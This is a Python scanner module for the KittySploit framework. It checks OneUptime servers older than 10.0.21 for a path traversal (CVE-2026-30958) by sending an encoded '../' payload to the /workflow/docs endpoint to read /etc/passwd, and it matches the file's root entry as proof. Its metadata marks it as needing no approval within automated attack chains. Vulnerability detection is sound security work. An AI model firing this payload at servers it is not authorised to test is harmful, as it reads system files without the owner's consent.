#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OneUptime < 10."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OneUptime < 10.0.21 - Path Traversal Detection',
        'description': 'OneUptime < 10.0.21 contains a path traversal caused by unsanitized componentName parameter in /workflow/docs/:componentName endpoint, letting unauthenticated attackers read arbitrary files from the server filesystem.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'oneuptime', 'lfi', 'path-traversal', 'vuln', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/OneUptime/oneuptime/security/advisories/GHSA-p2wh-9pw8-hvff',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-30958',
            'https://github.com/OneUptime/oneuptime',
        ],
        'cve': 'CVE-2026-30958',
    }

    def run(self):
        r = self.http_request(method="GET", path='/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="OneUptime < 10.0.21 - Path Traversal detected",
                path='/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            )
            return True
        return False

